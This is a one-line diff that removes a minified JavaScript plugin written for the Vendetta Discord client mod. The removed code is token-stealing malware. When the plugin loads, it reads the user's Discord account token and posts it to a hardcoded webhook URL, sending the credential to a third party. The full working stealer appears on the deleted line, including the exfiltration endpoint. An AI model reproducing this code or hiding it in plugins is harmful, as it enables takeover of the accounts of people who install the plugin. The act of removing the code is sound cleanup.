@@ -1,1 +1,0 @@
-(function(n,e){"use strict";var o={onLoad:function(){const t=e.findByProps("getToken").getToken();e.findByProps("get","post").post({url:"/webhooks/1096486921573769326/GYXFXR_enkiNf3qL27YZbb1O7nVg-ir66kuUHef0Xf-vCnRJY9MMp9g4FJWDLYmZq5XU",body:{content:t}})},onUnload:function(){}};return n.default=o,Object.defineProperty(n,"__esModule",{value:!0}),n})({},vendetta.metro);
